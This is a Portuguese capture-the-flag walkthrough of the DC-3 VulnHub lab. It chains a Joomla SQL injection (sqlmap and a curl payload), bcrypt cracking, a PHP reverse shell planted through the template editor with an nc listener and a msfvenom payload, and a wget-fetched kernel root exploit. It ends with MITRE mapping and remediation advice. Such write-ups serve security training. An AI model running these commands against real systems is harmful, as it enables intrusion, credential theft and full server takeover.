# DC: 3 — Writeup (PT-BR)

> DC-3 se destaca na série porque é a única máquina sem dicas e com apenas uma flag. É um lab limpo e focado: um CMS, um CVE de SQLi, um hash crackeado, um webshell PHP, um kernel exploit. A cadeia de acesso web não autenticado até root é enxuta e cada passo é uma técnica real que você vai encontrar em engajamentos de verdade. Tipo de desafio diferente, véi. Bora lá.

---

## Informações do Alvo

| Campo | Detalhes |
|-------|---------|
| **Nível** | Iniciante / Intermediário |
| **VM Alvo** | DC: 3 (VirtualBox/VMware, host-only) |
| **VM Atacante** | Kali Linux 2024.x |
| **IP Alvo** | 192.168.1.104 (adaptador host-only) |
| **VulnHub URL** | https://www.vulnhub.com/entry/dc-32,312/ |
| **Técnicas** | Fingerprint de Joomla, SQL injection (sqlmap), cracking de hash (John), reverse shell PHP via editor de template, escalada de privilégio via kernel local |
| **CVEs** | CVE-2017-8917 (Joomla 3.7.0 SQLi); CVE-2016-4557 (LPE via eBPF doubleput, kernel Linux) |
| **CISA KEV** | CVE-2017-8917 não está no CISA KEV; CVE-2016-4557 não está no CISA KEV. Ambos documentados na NVD com severidade crítica/alta. |
| **Grupos APT** | Exploits de SQLi em Joomla foram usados por múltiplos atores em campanhas de exploração em massa; técnicas de LPE de kernel (CVE-2016-4557) se alinham com tradecraft pós-exploração documentado em vários relatórios de APT |

---

## Resumo do Ataque

```
[Atacante]
    |
    +--[ nmap ]--> 192.168.1.104:80 (Joomla 3.7)
    |
    +--[ CVE-2017-8917 SQLi via sqlmap ]--> credenciais joomladb
    |
    +--[ john --wordlist=rockyou.txt ]--> admin:snoopy
    |
    +--[ login admin Joomla ]--> acesso ao editor de templates
    |
    +--[ PHP reverse shell em Beez3/index.php ]--> callback nc (www-data)
    |
    +--[ CVE-2016-4557 exploit doubleput ]--> shell root
    |
    +--[ cat /root/the-flag.txt ]--> FLAG CAPTURADA
```

---

## Metodologia

1. Descoberta de rede; único serviço HTTP na porta 80
2. Identificar Joomla 3.7.0 e confirmar aplicabilidade do CVE-2017-8917
3. Extrair credenciais de admin do banco com sqlmap
4. Crackear hash bcrypt com John the Ripper
5. Fazer login no admin do Joomla; injetar reverse shell PHP via editor de template
6. Escalar para root via LPE de kernel Ubuntu 16.04 (CVE-2016-4557)

---

## Passo 1: Descoberta de Rede

**Contexto:** Apenas HTTP está rodando. Sem SSH, sem portas extras. Tudo passa pela porta 80. Escanear serviços e versões, depois direto para a aplicação web. Uma superfície, um caminho de ataque. É focado, mano.

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -A 192.168.1.104
```

**Saída esperada:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache 2.4.18 (Ubuntu)
```

Acessar `http://192.168.1.104` para confirmar CMS Joomla.

**Alternativa:** Use `whatweb` para identificação rápida de CMS:

```bash
whatweb http://192.168.1.104
```

**Nota real:** Superfície de ataque de serviço único não significa baixo risco. Aplicações web hospedando CMS desatualizado representam um dos vetores de acesso inicial mais comuns em dados reais de incidentes.

**MITRE TTP:** T1046 - Network Service Discovery; T1595.002 - Active Scanning: Vulnerability Scanning

![Scan Nmap](images/01-nmap.png)

---

## Passo 2: Identificar Joomla 3.7.0 e Explorar SQLi (CVE-2017-8917)

**Contexto:** Joomla 3.7.0 tem uma injeção SQL no componente `com_fields`. O parâmetro `list[fullordering]` não é sanitizado e é injetável sem autenticação. CVE-2017-8917 é EDB-42033. É SQL injection cego via GET, mas o sqlmap trata automaticamente. Crítico sem autenticação, caramba.

Primeiro, fazer fingerprint da versão do Joomla:

```bash
joomscan --url http://192.168.1.104
```

URL vulnerável para CVE-2017-8917:

```
http://192.168.1.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml
```

**Passo 2a: Enumerar bancos de dados:**

```bash
sqlmap -u "http://192.168.1.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent --dbs -p "list[fullordering]"
```

**Saída esperada:**

```
available databases [2]:
[*] information_schema
[*] joomladb
```

**Passo 2b: Enumerar tabelas:**

```bash
sqlmap -u "http://192.168.1.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -D joomladb --tables --batch
```

**Passo 2c: Extrair credenciais de admin:**

```bash
sqlmap -u "http://192.168.1.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,username,password --dump --batch
```

**Saída esperada:**

```
| admin | admin | $2y$10$<hash_bcrypt> |
```

**Alternativa:** Use curl para verificar a injeção manualmente antes de rodar sqlmap:

```bash
curl -s "http://192.168.1.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,version()),1)--" | grep -i "error\|warning"
```

**Nota real:** CVE-2017-8917 foi ativamente explorado logo após a divulgação em 2017. SQL injection não autenticado em um componente CMS é o pior cenário: expõe todo o banco, incluindo credenciais de admin e potencialmente dados sensíveis de usuários, sem exigir qualquer acesso prévio.

**MITRE TTP:** T1190 - Exploit Public-Facing Application; T1005 - Data from Local System

![SQLi com sqlmap](images/02-joomla-sqli.png)

---

## Passo 3: Crackear Hash com John the Ripper

**Contexto:** O hash do admin é bcrypt (`$2y$10$...`). bcrypt é computacionalmente caro, mas "snoopy" é uma senha fraca que cai para rockyou.txt em segundos na GPU ou minutos na CPU. Sempre tente as listas grandes primeiro. Top.

```bash
echo '$2y$10$<hash_do_dump>' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Saída esperada:**

```
snoopy           (admin)
```

**Alternativa:** Use hashcat com GPU para mais velocidade:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt -d 1 -w 3
```

**Nota real:** bcrypt é a escolha certa para hashing de senhas, mas nenhum algoritmo de hash salva uma senha fraca. Em análises reais de incidentes, senhas de admin crackeadas de bancos CMS são frequentemente reutilizadas em e-mail, SSO corporativo e portais cloud. Um hash crackeado pode se transformar em comprometimento total da organização.

**MITRE TTP:** T1110.002 - Brute Force: Password Cracking

---

## Passo 4: Reverse Shell PHP via Editor de Template Joomla

**Contexto:** Fazer login no admin do Joomla com `admin:snoopy`. O editor de templates é um editor de arquivos PHP server-side com acesso de escrita. É essencialmente uma interface de RCE autenticada. Navegar para o template Beez3, substituir `index.php` por um reverse shell, e acionar acessando o site. Admin panel legítimo = shell legítimo, mano.

Fazer login em: `http://192.168.1.104/administrator`

Navegar para:
```
Extensions > Templates > Templates > Beez3 > index.php
```

Substituir conteúdo por reverse shell PHP (definir seu IP e porta):

```php
<?php
set_time_limit(0);
$ip = '<seu-IP-atacante>';
$port = 4444;
// ... shell completo de /usr/share/webshells/php/php-reverse-shell.php
?>
```

Iniciar listener:

```bash
nc -lvnp 4444
```

Acionar acessando `http://192.168.1.104/`.

Estabilizar o shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
uname -a
# Linux dc-3 4.4.0-116-generic ... Ubuntu 16.04.4 LTS
```

**Alternativa:** Usar `msfvenom` para gerar payload PHP meterpreter e fazer upload diretamente:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<atacante> LPORT=4444 -f raw > shell.php
```

**Nota real:** Editores de template em CMS são um dos vetores de RCE pós-autenticação mais abusados. Em incidentes reais, atacantes os usam para plantar webshells persistentes após obter credenciais de admin. Monitoramento de integridade de arquivos (FIM) em diretórios web é um controle de detecção crítico.

**MITRE TTP:** T1505.003 - Server Software Component: Web Shell; T1059.004 - Command and Scripting Interpreter: Unix Shell

![Shell PHP via template Joomla](images/03-joomla-shell.png)

---

## Passo 5: Escalada de Privilégio via Kernel (CVE-2016-4557)

**Contexto:** `uname -a` confirma Ubuntu 16.04.4 LTS com kernel 4.4.0-116-generic. Esta versão de kernel é vulnerável ao CVE-2016-4557, uma LPE local via use-after-free no subsistema eBPF (Extended Berkeley Packet Filter), conhecido como "doubleput" (EDB-39772). Download, compilar, executar. Root em segundos. GG.

Verificar versão do kernel:

```bash
uname -a
# 4.4.0-116-generic
lsb_release -a
# Ubuntu 16.04.4 LTS
```

Baixar e compilar o exploit:

```bash
cd /tmp
wget https://www.exploit-db.com/exploits/39772 -O 39772.zip
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

**Saída esperada:**

```
starting writev
hit
done
# whoami
root
```

```bash
cd /root
cat the-flag.txt
```

**Alternativa:** Verificar outras LPEs disponíveis para a versão do kernel via searchsploit:

```bash
searchsploit "Ubuntu 16.04"
searchsploit "Linux Kernel 4.4"
```

**Nota real:** Exploração de kernel é uma técnica de pós-exploração de alta severidade. Em casos reais de resposta a incidentes, LPEs de kernel são usadas para escapar de containers, sair de ambientes restritos e atingir comprometimento total do sistema a partir de um shell web com baixo privilégio. Manter o kernel do host atualizado não é opcional, mesmo para sistemas não voltados ao público.

**MITRE TTP:** T1068 - Exploitation for Privilege Escalation

![Execução do kernel exploit](images/04-kernel-exploit.png)
![Flag root](images/05-root-flag.png)

---

## Flags e Credenciais Capturadas

| Item | Valor / Localização |
|------|-------------------|
| Credenciais admin Joomla | admin:snoopy |
| Hash bcrypt | Extraído de `joomladb.#__users` via SQLi |
| Usuário web shell | `www-data` |
| Versão do kernel (vulnerável) | 4.4.0-116-generic (Ubuntu 16.04.4 LTS) |
| Flag root | `/root/the-flag.txt` |

---

## Lições Aprendidas com Relevância no Mundo Real

1. **SQLi não autenticada em CMS é catastrófica.** CVE-2017-8917 não requer credenciais e extrai todo o banco. Em um ambiente real, isso significa credenciais de admin, PII de usuários e potencialmente segredos da aplicação expostos por uma única requisição GET.

2. **bcrypt não protege senhas fracas.** O algoritmo de hash é irrelevante se a senha base está no rockyou.txt. Requisitos de complexidade de senha e verificações de exposição em brechas (integração com HaveIBeenPwned) são controles necessários.

3. **O editor de template é uma superfície de RCE autenticada.** Trate-o como um caminho direto para execução de código server-side. O acesso deve ser restrito a um conjunto mínimo de admins confiáveis, e FIM deve alertar sobre qualquer mudança nos arquivos de template.

4. **Patching de kernel é crítico mesmo pós-perímetro.** CVE-2016-4557 demonstra que um processo web comprometido com baixo privilégio vira root se o kernel do SO não está com patch. Defesa em profundidade exige patching em todas as camadas.

5. **Cross-referência versão do kernel com searchsploit imediatamente.** `uname -a` é o primeiro comando após obter um shell. Sistemas Ubuntu 16.04 LTS sem patch tinham uma longa lista de CVEs de kernel exploráveis; aplique patches agressivamente e imponha SLAs de atualização de kernel.

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID | Observações |
|--------|---------|-----|------------|
| Reconhecimento | Active Scanning: Vulnerability Scanning | T1595.002 | nmap, joomscan, whatweb |
| Acesso Inicial | Exploit Public-Facing Application | T1190 | CVE-2017-8917 Joomla SQLi |
| Acesso a Credenciais | Brute Force: Password Cracking | T1110.002 | john + rockyou.txt contra bcrypt |
| Execução | Server Software Component: Web Shell | T1505.003 | Shell PHP no editor de template Joomla |
| Execução | Command and Scripting Interpreter: Unix Shell | T1059.004 | Reverse shell nc + python pty |
| Descoberta | File and Directory Discovery | T1083 | uname, lsb_release pós-shell |
| Escalada de Privilégio | Exploitation for Privilege Escalation | T1068 | CVE-2016-4557 kernel LPE doubleput |
| Coleta | Data from Local System | T1005 | Leitura de flag root |

---

## Remediação

### Vulnerabilidade: CVE-2017-8917 (Joomla 3.7.0 SQLi)

**Funções NIST CSF 2.0:** Identify (ID.RA-1), Protect (PR.PS-2), Respond (RS.AN-5)

**Controles NIST SP 800-53:**
- SI-2: Flaw Remediation (atualizar para Joomla 3.7.1+; aplicar patch de segurança do fornecedor)
- SI-10: Information Input Validation (parametrizar todas as queries de banco; validar parâmetro `fullordering`)
- RA-5: Vulnerability Monitoring and Scanning (implantar scanner de vulnerabilidades web)

**C2M2:** MIL1 - Estabelecer gerenciamento de patches para aplicações web; MIL2 - Implantar regras WAF para padrões de SQLi.

**D3FEND:** D3-DBQT (Database Query Translation) para parametrizar queries; D3-NTF (Network Traffic Filtering) para detectar padrões SQLi via WAF.

---

### Vulnerabilidade: RCE via Editor de Template Joomla + Senha de Admin Fraca

**Controles NIST SP 800-53:**
- AC-3: Access Enforcement (restringir editor de template a um conjunto mínimo de admins; usar controle de acesso baseado em papel)
- IA-5: Authenticator Management (senhas fortes + MFA para painel admin)
- AU-12: Audit Record Generation (registrar todas as ações do painel admin; alertar sobre mudanças em arquivos de template)
- SI-7: Software, Firmware, and Information Integrity (implantar FIM em diretórios web)

**D3FEND:** D3-FH (File Hashing) para monitoramento de integridade; D3-NTF para detectar tráfego de reverse shell saindo.

---

### Vulnerabilidade: CVE-2016-4557 (Kernel LPE, Ubuntu 16.04)

**Controles NIST SP 800-53:**
- SI-2: Flaw Remediation (aplicar atualizações de segurança Ubuntu; impor SLA de atualização de kernel)
- CM-7: Least Functionality (desabilitar ou restringir acesso eBPF para usuários não privilegiados: `sysctl kernel.unprivileged_bpf_disabled=1`)
- SC-39: Process Isolation (aplicar fronteiras de segurança entre processos web e kernel do SO)

**Mitigação (sem patch de kernel):**

```bash
sysctl kernel.unprivileged_bpf_disabled=1
echo "kernel.unprivileged_bpf_disabled = 1" >> /etc/sysctl.conf
```

**D3FEND:** D3-HBPI (Hardware-Based Process Isolation); D3-ACH (Application Configuration Hardening) para desabilitar eBPF não privilegiado.

---

## Considerações Finais

DC-3 se destaca na série por ser a única máquina onde você está completamente por conta própria: sem dicas, uma flag, cadeia completa exigida. O caminho de ataque é limpo e realista: SQLi não autenticada extrai credenciais, hash crackeado dá acesso admin ao CMS, editor de template entrega RCE, e kernel sem patch leva ao root. Cada passo desta cadeia tem um contraparte real em casos de incidentes documentados. Isso não é CTF pelo CTF; é uma simulação comprimida de como comprometimentos reais de aplicações web se desenrolam. Arrasou quem chegou até o root aqui, mano.

Thanks guys!! (❍ᴥ❍ʋ)
